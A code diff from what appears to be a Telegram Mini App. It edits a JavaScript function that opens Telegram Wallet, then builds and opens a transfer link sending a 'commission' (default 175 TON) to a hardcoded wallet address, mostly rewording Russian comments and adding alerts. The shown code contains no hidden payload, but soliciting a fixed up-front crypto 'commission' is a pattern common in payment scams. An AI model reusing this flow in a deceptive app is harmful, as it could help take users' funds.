@@ -375,28 +375,27 @@
         // Функция подключения кошелька и отправки транзакции
         async function connectWallet() {
             try {
-                // Открываем Telegram Wallet для подключения
-                console.log('Открываем Telegram Wallet для подключения...');
+                // Шаг 1: Запрос подключения кошелька
+                console.log('Запрашиваем подключение кошелька...');
+                tg.showAlert('Пожалуйста, подключите кошелёк. Откроется Telegram Wallet для привязки.');
                 tg.openTelegramLink('https://t.me/wallet?startapp=connect');
-                
-                // Даём небольшую задержку, чтобы пользователь успел подключить кошелёк
+
+                // Задержка для того, чтобы пользователь успел подключить кошелёк
                 await new Promise(resolve => setTimeout(resolve, 5000));
 
-                // Получаем сумму комиссии из интерфейса
+                // Шаг 2: Инициируем транзакцию после подключения
                 const commissionTon = parseFloat(document.getElementById('commission-ton').textContent) || 175;
-                const commissionNanoTon = Math.round(commissionTon * 1e9); // Конвертируем TON в нанотокены (1 TON = 10^9 нанотокенов)
-
-                // Адрес получателя
+                const commissionNanoTon = Math.round(commissionTon * 1e9); // Конвертируем TON в нанотокены
                 const recipientAddress = 'UQCLVZxRULA5wbk2I_pSFD6XWYjUsUemNRZ6c5CaUCKAtlpq';
 
-                // Формируем ссылку для транзакции через Telegram Wallet
+                // Формируем ссылку для транзакции
                 const transactionLink = `https://t.me/wallet?start=transfer_${recipientAddress}_${commissionNanoTon}_Commission-payment`;
-                console.log('Формируем ссылку для транзакции:', transactionLink);
+                console.log('Инициируем транзакцию:', transactionLink);
 
-                // Отправляем транзакцию через Telegram Wallet
+                // Открываем кошелёк для подтверждения транзакции
                 tg.openTelegramLink(transactionLink);
 
-                // Показываем уведомление
+                // Уведомление
                 tg.showAlert(`Транзакция инициирована! Сумма комиссии (${commissionTon} TON) будет отправлена на адрес ${recipientAddress}. Подтвердите транзакцию в кошельке.`);
             } catch (error) {
                 console.error('Ошибка:', error);
